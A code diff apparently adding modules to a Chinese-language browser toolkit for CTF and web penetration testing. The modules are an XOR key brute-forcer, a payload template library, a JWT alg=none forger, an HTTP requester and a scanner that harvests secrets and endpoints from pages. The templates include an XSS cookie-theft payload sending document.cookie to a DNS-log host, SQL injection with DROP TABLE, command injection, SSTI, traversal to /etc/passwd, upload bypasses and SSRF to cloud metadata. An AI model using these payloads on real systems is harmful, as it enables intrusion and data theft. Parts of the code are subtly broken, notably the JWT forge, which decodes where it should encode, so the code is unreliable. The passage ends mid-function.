+  var keyLen = keyLenEl ? parseInt(keyLenEl.value, 10) : 1;
+  if (keyLen < 1) keyLen = 1;
+  var out = $('xorOut');
+  if (!out) { alert('找不到输出区域'); return; }
+  out.innerHTML = '';
+  xorResults = [];
+  
+  var data = t.replace(/\s/g, '');
+  var bytes = [];
+  if (mode === 'hex') {
+    if (!/^[0-9a-fA-F]+$/.test(data) || data.length % 2 !== 0) {
+      alert('Hex 格式错误：请输入偶数长度的十六进制字符串');
+      return;
+    }
+    for (var i = 0; i < data.length; i += 2) {
+      bytes.push(parseInt(data.substr(i, 2), 16));
+    }
+  } else {
+    for (var i = 0; i < data.length; i++) {
+      bytes.push(data.charCodeAt(i));
+    }
+  }
+  
+  if (bytes.length === 0) { alert('输入为空'); return; }
+  
+  // 已知明文辅助
+  var knownPlain = ($('xorKnownPlain').value || '').trim();
+  var knownBytes = [];
+  for (var i = 0; i < knownPlain.length; i++) {
+    knownBytes.push(knownPlain.charCodeAt(i));
+  }
+  
+  var total = Math.pow(256, keyLen);
+  var tried = 0;
+  
+  // 如果 keyLen=1，直接遍历 0-255
+  // 如果 keyLen>1，遍历所有组合（可能很大，做限制）
+  var maxCombinations = 1000000; // 最多尝试 100 万组合，避免浏览器卡死
+  
+  if (keyLen === 1) {
+    for (var k = 0; k < 256; k++) {
+      tried++;
+      var result = xorWithKey(bytes, [k]);
+      var score = scoreResult(result, knownBytes);
+      xorResults.push({key: [k], keyStr: k.toString(10), result: result, score: score});
+    }
+  } else {
+    // 多字节循环 XOR：如果已知明文非空，优先推导密钥
+    if (knownBytes.length > 0 && knownBytes.length <= bytes.length) {
+      // 用已知明文推导密钥流
+      var keyStream = [];
+      for (var i = 0; i < knownBytes.length; i++) {
+        keyStream.push(bytes[i] ^ knownBytes[i]);
+      }
+      // 检查密钥流是否具有 keyLen 的循环性
+      var isCyclic = true;
+      for (var i = keyLen; i < keyStream.length; i++) {
+        if (keyStream[i] !== keyStream[i % keyLen]) {
+          isCyclic = false;
+          break;
+        }
+      }
+      if (isCyclic) {
+        var derivedKey = keyStream.slice(0, keyLen);
+        var result = xorWithKey(bytes, derivedKey);
+        var score = scoreResult(result, knownBytes);
+        xorResults.push({key: derivedKey, keyStr: derivedKey.map(function(b){ return b.toString(16).padStart(2,'0'); }).join(''), result: result, score: score, derived: true});
+      } else {
+        // 循环性不成立，尝试暴力（可能很大）
+        var count = 0;
+        for (var combo = 0; combo < total && count < maxCombinations; combo++) {
+          var key = [];
+          var tmp = combo;
+          for (var j = 0; j < keyLen; j++) {
+            key.unshift(tmp % 256);
+            tmp = Math.floor(tmp / 256);
+          }
+          tried++;
+          count++;
+          var result = xorWithKey(bytes, key);
+          var score = scoreResult(result, knownBytes);
+          if (score > 0) {
+            xorResults.push({key: key, keyStr: key.map(function(b){ return b.toString(16).padStart(2,'0'); }).join(''), result: result, score: score});
+          }
+        }
+      }
+    } else {
+      // 无已知明文，暴力尝试（限制数量）
+      var count = 0;
+      for (var combo = 0; combo < total && count < maxCombinations; combo++) {
+        var key = [];
+        var tmp = combo;
+        for (var j = 0; j < keyLen; j++) {
+          key.unshift(tmp % 256);
+          tmp = Math.floor(tmp / 256);
+        }
+        tried++;
+        count++;
+        var result = xorWithKey(bytes, key);
+        var score = scoreResult(result, []);
+        if (score > 0) {
+          xorResults.push({key: key, keyStr: key.map(function(b){ return b.toString(16).padStart(2,'0'); }).join(''), result: result, score: score});
+        }
+      }
+    }
+  }
+  
+  xorResults.sort(function(a, b) {
+    if (b.score !== a.score) return b.score - a.score;
+    if (a.isFlag && !b.isFlag) return -1;
+    if (!a.isFlag && b.isFlag) return 1;
+    return a.keyStr.localeCompare(b.keyStr);
+  });
+  
+  renderXorResults();
+  addHist('XOR暴力', '密钥长度:' + keyLen + ' 尝试了 ' + tried + ' 个组合，输入长度 ' + bytes.length);
+}
+
+function xorWithKey(bytes, key){
+  var result = '';
+  var keyLen = key.length;
+  for (var i = 0; i < bytes.length; i++) {
+    var c = bytes[i] ^ key[i % keyLen];
+    result += String.fromCharCode(c);
+  }
+  return result;
+}
+
+function scoreResult(result, knownBytes){
+  var score = 0;
+  var lower = result.toLowerCase();
+  
+  // Flag 关键字（高权重）
+  var flagKeywords = ['flag{', 'ctf{', 'flag_', 'ctf_', 'wctf{', 'gctf{', 'bctf{', 'hctf{', 'pctf{', 'ectf{', 'rctf{', 'sctf{', 'tctf{', 'uctf{', 'vctf{', 'zctf{', 'flag{', 'flag{', 'key{', 'password{', 'secret{', 'token{'];
+  for (var i = 0; i < flagKeywords.length; i++) {
+    if (lower.includes(flagKeywords[i])) score += 100;
+  }
+  
+  // 已知明文匹配（最高权重）
+  if (knownBytes.length > 0) {
+    var knownStr = '';
+    for (var i = 0; i < knownBytes.length; i++) {
+      knownStr += String.fromCharCode(knownBytes[i]);
+    }
+    if (lower.includes(knownStr.toLowerCase())) score += 200;
+  }
+  
+  // 常见英文单词（中权重）
+  var commonWords = [' the ', ' and ', ' that ', ' have ', ' for ', ' with ', ' you ', ' not ', ' are ', ' from ', ' this ', ' but ', ' they ', ' we ', ' he ', ' she ', ' it ', ' be ', ' was ', ' will ', ' can ', ' what ', ' all ', ' were ', ' your ', ' say ', ' her ', ' she ', ' him ', ' his ', ' me ', ' my ', ' our ', ' us ', ' is ', ' a ', ' i ', ' to ', ' of ', ' in ', ' it ', ' you '];
+  for (var i = 0; i < commonWords.length; i++) {
+    if (lower.includes(commonWords[i])) score += 10;
+  }
+  
+  // 可打印字符比例（低权重，避免乱码排前面）
+  var printable = 0;
+  for (var i = 0; i < result.length; i++) {
+    var ch = result.charCodeAt(i);
+    if (ch >= 32 && ch < 127) printable++;
+  }
+  var printableRatio = printable / Math.max(1, result.length);
+  if (printableRatio > 0.8) score += 20;
+  if (printableRatio > 0.9) score += 20;
+  
+  // 常见标点
+  var punct = ['.', ',', '!', '?', ':', ';', '-', '_', ' ', '{', '}', '(', ')', '[', ']', '"', '\''];
+  var punctCount = 0;
+  for (var i = 0; i < result.length; i++) {
+    if (punct.indexOf(result[i]) !== -1) punctCount++;
+  }
+  if (punctCount > 0) score += 5;
+  
+  return score;
+}
+
+function renderXorResults() {
+  var out = $('xorOut');
+  var filter = ($('xorFilter').value || '').toLowerCase();
+  out.innerHTML = '';
+  
+  var filtered = xorResults.filter(function(item) {
+    if (!filter) return true;
+    return item.result.toLowerCase().includes(filter) || item.keyStr.toLowerCase().includes(filter) || ('key ' + item.keyStr).toLowerCase().includes(filter);
+  });
+  
+  if (filtered.length === 0) {
+    out.innerHTML = '<div class="empty">无匹配结果</div>';
+    return;
+  }
+  
+  for (var i = 0; i < filtered.length; i++) {
+    var item = filtered[i];
+    var div = document.createElement('div');
+    div.className = 'xor-item' + (item.score >= 100 ? ' flag-found' : '');
+    
+    // 计算可打印比例
+    var printable = 0;
+    for (var j = 0; j < item.result.length; j++) {
+      var ch = item.result.charCodeAt(j);
+      if (ch >= 32 && ch < 127) printable++;
+    }
+    var printableRatio = (printable / Math.max(1, item.result.length) * 100).toFixed(0);
+    
+    var html = '<div class="xor-key" style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">';
+    html += '<span style="font-weight:700;color:#2563eb;">Key: ' + item.keyStr + '</span>';
+    if (item.derived) html += '<span class="badge" style="background:#dcfce7;color:#166534;">已推导</span>';
+    if (item.score >= 100) html += '<span class="badge" style="background:#fef2f2;color:#991b1b;">高置信度</span>';
+    else if (item.score >= 50) html += '<span class="badge" style="background:#fef3c7;color:#92400e;">中置信度</span>';
+    html += '<span style="font-size:11px;color:#9ca3af;">可读 ' + printableRatio + '%</span>';
+    html += '<span style="font-size:11px;color:#9ca3af;">得分 ' + item.score + '</span>';
+    html += '</div>';
+    html += '<div class="xor-val" style="white-space:pre-wrap;word-break:break-all;">' + escapeHtml(item.result) + '</div>';
+    html += '<button class="copy-btn" onclick="copyXorResult(\'' + escapeJs(item.keyStr) + '\')">复制密钥</button>';
+    html += '<button class="copy-btn" onclick="copyXorResult(\'' + escapeJs(item.result) + '\')" style="margin-left:6px;">复制结果</button>';
+    div.innerHTML = html;
+    out.appendChild(div);
+  }
+}
+
+function filterXorResults() {
+  if (xorResults.length > 0) renderXorResults();
+}
+
+function copyXorResult(key) {
+  var item = null; for (var i = 0; i < xorResults.length; i++) { if (xorResults[i].key === key) { item = xorResults[i]; break; } }
+  if (item) {
+    navigator.clipboard.writeText(item.result).then(function(){ alert('已复制 Key ' + key + ' 的结果'); });
+  }
+}
+
+function clearXor() { $('xorIn').value = ''; $('xorOut').innerHTML = ''; xorResults = []; }
+
+// ===== Payload Templates =====
+var PAYLOADS = {
+  xss: {
+    name: 'XSS',
+    subs: [
+      {name: 'alert 弹窗', tag: '通用测试', type: 'reflect', val: '<script>alert(1)<\/script>'},
+      {name: 'img onerror', tag: '过滤script时使用', type: 'reflect', val: '<img src=x onerror=alert({val})>'},
+      {name: 'svg onload', tag: '绕过基础过滤', type: 'reflect', val: '<svg onload=alert({val})>'},
+      {name: 'body onload', tag: '页面级触发', type: 'reflect', val: '<body onload=alert({val})>'},
+      {name: 'JS 上下文闭合', tag: '闭合 JS 上下文', type: 'reflect', val: '");alert({val});//'},
+      {name: '窃取 Cookie', tag: '外带数据', type: 'blind', val: '<img src=x onerror=fetch(\'{dnslog}?c=\'+document.cookie)>'}
+    ]
+  },
+  sqli: {
+    name: 'SQL注入',
+    subs: [
+      {name: '基本单引号', tag: '探测注入点', type: 'reflect', val: '\''},
+      {name: 'UNION 注入', tag: '提取数据', type: 'reflect', val: "' UNION SELECT 1,2,3-- "},
+      {name: '布尔盲注', tag: '无回显判断', type: 'blind', val: "' OR 1=1-- "},
+      {name: '时间盲注 SLEEP', tag: '基于时间', type: 'blind', val: "' OR SLEEP({cmd})-- "},
+      {name: '报错注入 UPDATEXML', tag: 'MySQL 报错', type: 'reflect', val: "' OR UPDATEXML(1,CONCAT(0x7e,VERSION()),0)-- "},
+      {name: '堆叠注入', tag: '多语句执行', type: 'reflect', val: "'; DROP TABLE users-- "}
+    ]
+  },
+  cmdi: {
+    name: '命令注入',
+    subs: [
+      {name: '反引号 whoami', tag: 'Linux', type: 'reflect', val: '`{cmd}`'},
+      {name: '$() 括号', tag: 'Linux', type: 'reflect', val: '$(whoami)'},
+      {name: '分号 ;', tag: '命令分隔', type: 'reflect', val: '; {cmd}'},
+      {name: '&&', tag: '条件执行', type: 'reflect', val: '&& {cmd}'},
+      {name: '管道 |', tag: '输出重定向', type: 'reflect', val: '| {cmd}'}
+    ]
+  },
+  ssti: {
+    name: '模板注入',
+    subs: [
+      {name: 'Jinja2 7*7', tag: '探测注入点', type: 'reflect', val: '{{7*7}}'},
+      {name: 'Jinja2 RCE', tag: '远程代码执行', type: 'reflect', val: '{{__class__.__mro__[1].__subclasses__()}}'},
+      {name: 'Twig 7*7', tag: 'PHP Twig', type: 'reflect', val: '{{7*7}}'},
+      {name: 'Freemarker', tag: 'Java 模板', type: 'reflect', val: '${7*7}'},
+      {name: 'Velocity', tag: 'Java Velocity', type: 'reflect', val: '#set($x=7*7)${x}'}
+    ]
+  },
+  lfi: {
+    name: '文件包含',
+    subs: [
+      {name: '读取 /etc/passwd', tag: 'Linux 系统文件', type: 'reflect', val: '../../../../etc/passwd'},
+      {name: '读取 /proc/self/environ', tag: '进程环境变量', type: 'reflect', val: '../../../../proc/self/environ'},
+      {name: 'PHP 伪协议', tag: 'php://input', type: 'reflect', val: 'php://input'},
+      {name: '日志访问', tag: 'Apache 日志', type: 'reflect', val: '../../../../var/log/apache2/access.log%00'}
+    ]
+  },
+  upload: {
+    name: '文件上传',
+    subs: [
+      {name: '双后缀名', tag: '绕过后缀检查', type: 'reflect', val: 'shell.php.jpg'},
+      {name: '大小写绕过', tag: 'PHP 大小写', type: 'reflect', val: 'shell.PhP'},
+      {name: '空字节截断', tag: 'PHP <5.3.4', type: 'reflect', val: 'shell.php%00.jpg'}
+    ]
+  },
+  ssrf: {
+    name: 'SSRF',
+    subs: [
+      {name: '本地探测', tag: '探测内网', type: 'blind', val: 'http://127.0.0.1:{cmd}'},
+      {name: '云元数据', tag: 'AWS/Aliyun', type: 'blind', val: 'http://169.254.169.254/latest/meta-data/'},
+      {name: 'DNSLog 外带', tag: '无回显验证', type: 'blind', val: 'http://{dnslog}'}
+    ]
+  }
+};
+
+var currentCat = 'xss';
+var currentSub = null;
+var placeholders = {};
+
+function initPayloads(){
+  var catSel = $('payloadCat');
+  catSel.innerHTML = '';
+  for (var key in PAYLOADS) {
+    var cat = PAYLOADS[key];
+    var opt = document.createElement('option');
+    opt.value = key;
+    opt.textContent = cat.name;
+    catSel.appendChild(opt);
+  }
+  catSel.value = 'xss';
+  loadSubTemplates();
+}
+function onCatChange(){
+  currentCat = $('payloadCat').value;
+  loadSubTemplates();
+}
+function loadSubTemplates(){
+  var subSel = $('payloadSub');
+  var cat = PAYLOADS[currentCat];
+  subSel.innerHTML = '<option value="">-- 请选择子模板 --</option>';
+  for (var i = 0; i < cat.subs.length; i++) {
+    var sub = cat.subs[i];
+    var opt = document.createElement('option');
+    opt.value = i;
+    var typeLabel = sub.type === 'blind' ? ' [盲注]' : ' [回显]';
+    opt.textContent = sub.name + typeLabel;
+    subSel.appendChild(opt);
+  }
+  currentSub = null;
+  $('payloadEditor').value = '';
+  $('payloadResult').style.display = 'none';
+  $('placeholderForm').innerHTML = '';
+  var lang = 'HTML';
+  if (currentCat === 'sqli') lang = 'SQL';
+  else if (currentCat === 'ssti') lang = 'Jinja2';
+  $('syntaxLang').textContent = lang;
+}
+function onSubChange(){
+  var idx = $('payloadSub').value;
+  if (idx === '') {
+    currentSub = null;
+    $('payloadEditor').value = '';
+    $('payloadResult').style.display = 'none';
+    $('placeholderForm').innerHTML = '';
+    return;
+  }
+  currentSub = parseInt(idx);
+  var cat = PAYLOADS[currentCat];
+  var sub = cat.subs[currentSub];
+  $('payloadEditor').value = sub.val;
+  var matches = sub.val.match(/\{([a-zA-Z]+)\}/g) || [];
+  var seen = {};
+  placeholders = {};
+  for (var i = 0; i < matches.length; i++) {
+    var name = matches[i].slice(1, -1);
+    if (!seen[name]) {
+      seen[name] = true;
+      placeholders[name] = '';
+    }
+  }
+  renderPlaceholderForm();
+}
+function renderPlaceholderForm(){
+  var form = $('placeholderForm');
+  if (!placeholders || Object.keys(placeholders).length === 0) {
+    form.innerHTML = '';
+    return;
+  }
+  var html = '<label style="margin-bottom:8px;">占位符参数（自动识别）</label>';
+  for (var key in placeholders) {
+    html += '<div class="placeholder-row">';
+    html += '<span class="placeholder-label">{' + key + '}</span>';
+    html += '<input type="text" id="ph_' + key + '" placeholder="输入 ' + key + '" value="">';
+    html += '</div>';
+  }
+  form.innerHTML = html;
+}
+function applyPlaceholders(){
+  if (currentSub === null) return alert('请先选择子模板');
+  var cat = PAYLOADS[currentCat];
+  var sub = cat.subs[currentSub];
+  var result = sub.val;
+  for (var key in placeholders) {
+    var val = $('ph_' + key) ? $('ph_' + key).value : '';
+    result = result.replace(new RegExp('\\{' + key + '\\}', 'g'), val);
+  }
+  $('payloadResultText').value = result;
+  $('payloadResult').style.display = 'block';
+  addHist('Payload生成', result.slice(0,100));
+}
+function copyPayload(){
+  var t = $('payloadResultText');
+  if (!t || !t.value) return alert('先生成 Payload');
+  navigator.clipboard.writeText(t.value).then(function(){ alert('已复制'); });
+}
+function encodeUrl(){
+  var t = $('payloadResultText');
+  if (!t || !t.value) return alert('先生成 Payload');
+  t.value = encodeURIComponent(t.value);
+}
+function encodeUrlDouble(){
+  var t = $('payloadResultText');
+  if (!t || !t.value) return alert('先生成 Payload');
+  t.value = encodeURIComponent(encodeURIComponent(t.value));
+}
+function encodeHtml(){
+  var t = $('payloadResultText');
+  if (!t || !t.value) return alert('先生成 Payload');
+  t.value = escapeHtml(t.value);
+}
+function encodeUni(){
+  var t = $('payloadResultText');
+  if (!t || !t.value) return alert('先生成 Payload');
+  t.value = Array.from(t.value).map(function(c){ return '\\u'+c.charCodeAt(0).toString(16).padStart(4,'0'); }).join('');
+}
+
+// ===== JWT Tool =====
+function b64uDec(s){ s = s.replace(/-/g,'+').replace(/_/g,'/'); while (s.length % 4) s += '='; try { return decodeURIComponent(escape(atob(s))); } catch(e) { return null; } }
+function jwtDecode(){
+  var t = $('jwtInput').value.trim(); if (!t) return alert('请输入 JWT');
+  var parts = t.split('.'); if (parts.length < 2) return alert('JWT 格式错误');
+  try { $('jwtHeader').innerHTML = '<h4>Header</h4><pre>' + escapeHtml(JSON.stringify(JSON.parse(b64uDec(parts[0]) || '{}', null, 2))) + '</pre>'; }
+  catch(e) { $('jwtHeader').innerHTML = '<h4>Header</h4><pre>解析失败</pre>'; }
+  try { $('jwtPayload').innerHTML = '<h4>Payload</h4><pre>' + escapeHtml(JSON.stringify(JSON.parse(b64uDec(parts[1]) || '{}', null, 2))) + '</pre>'; }
+  catch(e) { $('jwtPayload').innerHTML = '<h4>Payload</h4><pre>解析失败</pre>'; }
+  $('jwtSig').innerHTML = '<h4>Signature</h4><pre>' + (parts[2] || '(无)') + '</pre>';
+  var pl = JSON.parse(b64uDec(parts[1]) || '{}'); $('jwtNewPayload').value = JSON.stringify(pl, null, 2);
+  addHist('JWT解析', '已解析 JWT');
+}
+function jwtForge(){
+  try {
+    var pl = JSON.parse($('jwtNewPayload').value);
+    var h = b64uDec(JSON.stringify({alg:'none', typ:'JWT'}));
+    var p = b64uDec(JSON.stringify(pl));
+    var jwt = h + '.' + p + '.';
+    $('jwtResult').innerHTML = '<span class="mono">' + escapeHtml(jwt) + '</span> <span class="badge">alg=none (未签名)</span>';
+    addHist('JWT伪造', '生成新 JWT');
+  } catch(e) { alert('Payload JSON 格式错误'); }
+}
+function jwtCopy(){ var r = $('jwtResult').textContent; if (!r) return alert('先生成 JWT'); navigator.clipboard.writeText(r); alert('已复制'); }
+function jwtClear(){$('jwtInput').value='';$('jwtHeader').innerHTML='';$('jwtPayload').innerHTML='';$('jwtSig').innerHTML='';$('jwtResult').innerHTML=''; }
+
+// ===== HTTP Request =====
+async function httpSend(){
+  var url = $('httpUrl').value; if (!url) return alert('请输入 URL');
+  var res = $('httpRes'); res.value = '发送中...';
+  try {
+    var opts = {method: $('httpMethod').value, headers:{}};
+    $('httpHeaders').value.split('\n').forEach(function(l){ if (l.trim()) { var i = l.indexOf(':'); if (i > 0) { opts.headers[l.slice(0,i).trim()] = l.slice(i+1).trim(); } } });
+    if (['POST','PUT','DELETE'].indexOf(opts.method) > -1 && $('httpBody').value) { opts.body = $('httpBody').value; opts.headers['Content-Type'] = opts.headers['Content-Type'] || 'application/x-www-form-urlencoded'; }
+    var r = await fetch(url, opts); var txt = await r.text();
+    res.value = 'HTTP ' + r.status + ' ' + r.statusText + '\n\nHeaders:\n' + JSON.stringify(Object.fromEntries(r.headers.entries()), null, 2) + '\n\nBody:\n' + txt;
+    addHist('HTTP请求', opts.method + ' ' + url + ' -> ' + r.status);
+  } catch(e) { res.value = 'Error: ' + e.message; }
+}
+function httpClear(){$('httpUrl').value='';$('httpMethod').value='GET';$('httpHeaders').value='';$('httpBody').value='';$('httpRes').value=''; }
+
+// HTTP 响应 → JSRecon 粘贴区，一键扫描响应内容
+function httpResToJsRecon(){
+  var res = $('httpRes').value;
+  if (!res || res === '发送中...' || res.indexOf('Error:') === 0) {
+    return alert('没有可扫描的响应内容，请先发送请求');
+  }
+  
+  // 提取 Body 部分（在 "Body:\n" 之后）
+  var bodyStart = res.indexOf('\n\nBody:\n');
+  var body = bodyStart > -1 ? res.substring(bodyStart + 8) : res;
+  
+  // 如果 body 看起来像 HTML，直接填到粘贴区
+  if (body.trim().startsWith('<') || body.includes('<html') || body.includes('<form') || body.includes('<script')) {
+    $('jsReconHtmlPaste').value = body;
+    // 启用所有扫描选项
+    $('jsReconScanEndpoints').checked = true;
+    $('jsReconScanSecrets').checked = true;
+    $('jsReconScanForms').checked = true;
+    $('jsReconScanDebug').checked = true;
+    alert('响应内容已填入 JSRecon 粘贴区，点击「扫描粘贴的 HTML」');
+  } else {
+    // 非 HTML 内容，也填进去让用户决定
+    $('jsReconHtmlPaste').value = body;
+    alert('响应内容已填入 JSRecon 粘贴区（非 HTML，可手动检查）');
+  }
+  
+  // 滚动到 JSRecon 部分
+  var jsReconCard = document.querySelector('.card:nth-child(7)');
+  if (jsReconCard) jsReconCard.scrollIntoView({behavior: 'smooth'});
+}
+
+// ===== JSRecon 资产侦察（优化版） =====
+var jsReconFindings = {
+  endpoints: [],      // {value, type, source, severity, fullUrl}
+  secrets: [],
+  forms: [],
+  debug: []
+};
+
+// 静态资源后缀黑名单，自动过滤噪音
+var STATIC_SUFFIXES = ['.js', '.css', '.ico', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.woff', '.woff2', '.ttf', '.eot', '.map', '.pdf', '.zip', '.gz', '.tar', '.mp4', '.mp3', '.wav', '.avi', '.mov', '.webp', '.avif', '.otf'];
+
+function jsReconScan(){
+  var url = $('jsReconUrl').value;
+  if (!url || !url.trim()) return alert('请先输入目标 URL');
+  
+  // Clear previous results
+  jsReconFindings = {endpoints: [], secrets: [], forms: [], debug: []};
+  $('jsReconResults').innerHTML = '';
+  $('jsReconStats').style.display = 'none';
+  
+  // Determine scan options
+  var scanEndpoints = $('jsReconScanEndpoints').checked;
+  var scanSecrets = $('jsReconScanSecrets').checked;
+  var scanForms = $('jsReconScanForms').checked;
+  var scanDebug = $('jsReconScanDebug').checked;
+  
+  fetchTargetAndScan(url, scanEndpoints, scanSecrets, scanForms, scanDebug);
+}
+
+async function fetchTargetAndScan(url, scanEndpoints, scanSecrets, scanForms, scanDebug){
+  try {
+    var res = $('jsReconResults');
+    res.innerHTML = '<div style="padding:10px;color:#666;">正在扫描：' + escapeHtml(url) + '...</div>';
+    
+    var response;
+    try {
+      response = await fetch(url, {mode: 'cors'});
+    } catch(e) {
+      res.innerHTML = '<div style="padding:10px;color:#dc2626;">直接获取失败（可能是 CORS 限制）。<br>请在目标页面打开开发者工具 Console，粘贴并运行下方 Bookmarklet 代码：<br><button class="btn primary" onclick="copyJsReconBookmarklet()">复制 Bookmarklet 代码</button></div>';
+      return;
+    }
+    
+    if (!response.ok) {
+      res.innerHTML = '<div style="padding:10px;color:#dc2626;">HTTP ' + response.status + ' ' + response.statusText + '</div>';
+      return;
+    }
+    
+    var html = await response.text();
+    scanHtmlContent(html, url, scanEndpoints, scanSecrets, scanForms, scanDebug);
+    dedupeFindings();
+    renderJsReconResults();
+    
+  } catch(e) {
+    $('jsReconResults').innerHTML = '<div style="padding:10px;color:#dc2626;">扫描出错：' + escapeHtml(e.message) + '</div>';
+    console.error(e);
+  }
+}
+
+// 去重：同一 URL 只保留一条
+function dedupeFindings(){
+  var seenUrls = new Set();
+  var deduped = [];
+  for (var i = 0; i < jsReconFindings.endpoints.length; i++) {
+    var ep = jsReconFindings.endpoints[i];
+    var key = ep.fullUrl || ep.value;
+    if (!seenUrls.has(key)) {
+      seenUrls.add(key);
+      deduped.push(ep);
+    }
+  }
+  jsReconFindings.endpoints = deduped;
+  
+  // 去重 secrets（按 value 去重）
+  var seenSecrets = new Set();
+  var dedupedSecrets = [];
+  for (var i = 0; i < jsReconFindings.secrets.length; i++) {
+    var s = jsReconFindings.secrets[i];
+    var key = s.value;
+    if (!seenSecrets.has(key)) {
+      seenSecrets.add(key);
+      dedupedSecrets.push(s);
+    }
+  }
+  jsReconFindings.secrets = dedupedSecrets;
+}
+
+function scanPastedHtml(){
+  var html = $('jsReconHtmlPaste').value;
+  if (!html || !html.trim()) return alert('请先粘贴 HTML 源码');
+  
+  var url = $('jsReconUrl').value || 'http://localhost';
+  if (!url.endsWith('/')) url = url;
+  
+  var scanEndpoints = $('jsReconScanEndpoints').checked;
+  var scanSecrets = $('jsReconScanSecrets').checked;
+  var scanForms = $('jsReconScanForms').checked;
+  var scanDebug = $('jsReconScanDebug').checked;
+  
+  // Clear previous results
+  jsReconFindings = {endpoints: [], secrets: [], forms: [], debug: []};
+  $('jsReconResults').innerHTML = '';
+  $('jsReconStats').style.display = 'none';
+  
+  scanHtmlContent(html, url, scanEndpoints, scanSecrets, scanForms, scanDebug);
+  dedupeFindings();
+  renderJsReconResults();
+  addHist('JSRecon扫描(粘贴HTML)', '端点:' + jsReconFindings.endpoints.length + ' 密钥:' + jsReconFindings.secrets.length + ' 表单:' + jsReconFindings.forms.length + ' 调试:' + jsReconFindings.debug.length);
+}
+
+function scanHtmlContent(html, baseUrl, scanEndpoints, scanSecrets, scanForms, scanDebug){
+  var tmp = document.createElement('div');
+  tmp.innerHTML = html;
+  
+  // 1. Scan script tags
+  var scripts = tmp.querySelectorAll('script');
+  for (var i = 0; i < scripts.length; i++) {
+    var src = scripts[i].getAttribute('src');
+    var content = scripts[i].textContent || scripts[i].innerHTML || '';
+    
+    if (src && scanEndpoints) {
+      var fullUrl = resolveUrl(baseUrl, src);
+      if (!isStaticResource(fullUrl)) {
+        jsReconFindings.endpoints.push({
+          type: 'script_src',
+          value: src,
+          fullUrl: fullUrl,
+          severity: 'info',
+          source: 'script'
+        });
+      }
+    }
+    
+    if (content && scanSecrets) {
+      scanForSecrets(content, 'inline_script');
+    }
+    if (content && scanEndpoints) {
+      scanForEndpoints(content, baseUrl, 'inline_script');
+    }
+  }
+  
+  // 2. Scan link tags
+  if (scanEndpoints) {
+    var links = tmp.querySelectorAll('link[href]');
+    for (var i = 0; i < links.length; i++) {
+      var href = links[i].getAttribute('href');
+      if (href) {
+        var fullUrl = resolveUrl(baseUrl, href);
+        if (!isStaticResource(fullUrl)) {
+          jsReconFindings.endpoints.push({
+            type: 'link',
+            value: href,
+            fullUrl: fullUrl,
+            severity: 'info',
+            source: 'link'
+          });
+        }
+      }
+    }
+  }
+  
+  // 3. Scan forms
+  if (scanForms) {
+    var forms = tmp.querySelectorAll('form');
+    for (var i = 0; i < forms.length; i++) {
+      var form = forms[i];
+      var action = form.getAttribute('action') || '';
+      var fullAction = action ? resolveUrl(baseUrl, action) : baseUrl;
+      jsReconFindings.forms.push({
+        action: fullAction,
+        method: form.getAttribute('method') || 'GET',
+        inputs: Array.from(form.querySelectorAll('input')).map(function(inp){
+          return {name: inp.getAttribute('name') || '', type: inp.getAttribute('type') || 'text'};
+        }),
+        severity: 'info'
+      });
+    }
+  }
+  
+  // 4. Scan debug paths
+  if (scanDebug) {
+    var debugPaths = ['/debug', '/console', '/phpinfo', '/.env', '/.git', '/swagger', '/api-docs', '/admin', '/manager', '/test'];
+    debugPaths.forEach(function(path){
+      if (html.toLowerCase().includes(path.toLowerCase())) {
+        jsReconFindings.debug.push({
+          path: resolveUrl(baseUrl, path),
+          severity: 'warning'
+        });
+      }
+    });
+  }
+  
+  // 5. Scan HTML for secrets
+  if (scanSecrets) {
+    scanForSecrets(html, 'html_content');
+  }
+  
+  // 6. Scan HTML for endpoints
+  if (scanEndpoints) {
+    scanForEndpoints(html, baseUrl, 'html_content');
+  }
+}
+
+function isStaticResource(url){
+  var lower = url.toLowerCase();
+  for (var i = 0; i < STATIC_SUFFIXES.length; i++) {
+    if (lower.endsWith(STATIC_SUFFIXES[i])) return true;
+  }
+  return false;
+}
+
+function scanForSecrets(content, source){
+  var patterns = [
+    {name: 'API Key', regex: /api[_-]?key\s*[:=]\s*['"]([^'"]{3,})['"]/gi},
+    {name: 'Secret', regex: /secret\s*[:=]\s*['"]([^'"]{3,})['"]/gi},
+    {name: 'Token', regex: /token\s*[:=]\s*['"]([^'"]{3,})['"]/gi},
+    {name: 'Password', regex: /password\s*[:=]\s*['"]([^'"]{3,})['"]/gi},
+    {name: 'AWS Access Key', regex: /AKIA[0-9A-Z]{16}/g},
+    {name: 'Private Key', regex: /-----BEGIN (RSA |EC )?PRIVATE KEY-----/g},
+    {name: 'JWT', regex: /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g},
+    {name: 'DB Connection', regex: /(mongodb|mysql|postgres|redis):\/\/[^'"]+/gi},
+    {name: 'S3 Bucket', regex: /s3[_-]?bucket\s*[:=]\s*['"]([^'"]+)['"]/gi},
+    {name: 'Slack Webhook', regex: /hooks\.slack\.com\/services\/[A-Za-z0-9+/]+/g}
+  ];
+  
+  patterns.forEach(function(p){
+    var matches = content.match(p.regex);
+    if (matches) {
+      matches.forEach(function(m){
+        jsReconFindings.secrets.push({
+          type: p.name,
+          value: m.substring(0, 100),
+          source: source,
+          severity: p.name === 'Private Key' || p.name === 'JWT' ? 'critical' : 'warning'
+        });
+      });
+    }
+  });
+}
+
+function scanForEndpoints(content, baseUrl, source){
+  var patterns = [
+    /['"]\/(api|v\d+|graphql|rest|auth|login|admin|debug|upload|download|file|static|asset)[^'"]*['"]/gi,
+    /fetch\s*\(\s*['"]([^'"]+)['"]/gi,
+    /axios\.(get|post|put|delete|patch)\s*\(\s*['"]([^'"]+)['"]/gi,
+    /\$\.ajax\s*\(\s*\{[^}]*url\s*:\s*['"]([^'"]+)['"]/gi,
+    /\$\(['"]([^'"]+)['"]\)\.(load|get|post|ajax)/gi
+  ];
+  
+  patterns.forEach(function(regex){
+    var matches = content.match(regex);
+    if (matches) {
+      matches.forEach(function(m){
+        var clean = m.replace(/['"]/g, '');
+        var fullUrl = resolveUrl(baseUrl, clean);
+        if (!isStaticResource(fullUrl)) {
+          jsReconFindings.endpoints.push({
+            type: 'endpoint',
+            value: clean,
+            fullUrl: fullUrl,
+            severity: 'info',
+            source: source
+          });
+        }
+      });
+    }
+  });
+}
+
+function resolveUrl(base, relative){
+  try {
+    return new URL(relative, base).href;
+  } catch(e) {
+    return relative;
+  }
+}
+
+// 快捷操作：发送测试到 HTTP 请求模块
+function sendToHttpTest(fullUrl, method){
